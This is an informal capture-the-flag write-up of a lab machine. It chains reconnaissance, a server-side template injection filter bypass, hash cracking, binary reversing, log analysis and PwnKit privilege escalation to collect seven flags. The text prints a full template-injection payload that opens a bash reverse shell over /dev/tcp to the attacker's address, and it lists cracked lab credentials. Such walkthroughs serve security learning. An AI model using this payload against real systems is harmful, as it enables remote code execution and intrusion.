Started with a nmap scan
```
22 OpenSSH 8.2p1
80 nginx 1.13.12
8888 ? telnet to connect to this 
```
Going to the website there is a `.git` folder we can dump also ran a gobuster scan on the host
```
/configuration
/.git
/login
/logout
/profile
/signup
```
We can also make a account and get access to a dashboard called `alert system v1` and when we login it ask us to configure a smtp server had to make a python script to receive the email and we get are first flag looking at the source code in the git dump `app.py` we notice there is a SSTI vulnerability and when we send `{{7*7}}` the first park `{` does not get rendered so we need to find a way around it and we can see the response in are smtp server we can bypass this with `{% %}` so are payload will looks like this 
`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/10.10.xx.xx/443 0>&1"')]'read']() == 'chiv' %} a {% endif %}` and we get a callback as the root user and we got the second flag we are in the `/app` folder there is another folder called DB with a database in it we can turn this into base64 and then copy it to are machine and decode it and its a SQLite file and we have 7 users take the hashes and now we need to try and crack them and we cracked 5 of the accounts and testing them all we found two that can SSH into the host `pasta:antihacker` and in the home folder of this user we find a file called `crackme` when reversing the file we find in the main function part of the flag and we can make a script to brute the rest of the flag and when I was testing the logins the other account that could SSH was the admin account `administraotr:ihatepasta` and in there home folder there is a elf file called `tcp-server` but we don't have permissions to use it root does if we run strings we can see to possible users `root,pasta` and we have the password for the user pasta and we also notice its the binary running on port `8888` and we get the flag the strings also said that we have mail in the `/var/mail/administraotr` and they said there was something done to `update.php` file and they give us the path to the `apache.log` file and gives us the log format searching in the log file we find sqlmap was modifying it and can make a python script to read the log file were looking for `!=<char>` and convert it to a integer and then convert it to ASCII and we get the flag now we need to privsec as the admin user running linpeas shows a couple exploits we cam run to get root I used PwnKit when we are root there is a file called `chrootkit.txt` and there is the reptile rootkit on the host and doing some google searching we can unhide the files and in the `/`
 folder there is a folder called `reptilezRoberto` we can see after we unhide the files and there is the last flag 

Flags
1. send a email to my self
2. SSTI in the profile url then send email to are smtp and get reverse shell as root 
3. reverse `crackme` file and brute the flag 
4. read the logfile to get the flag
5. go from admin to root flag in root folder 
6. login with the user pasta on port 8888
7.  `/` reptile unhide the files 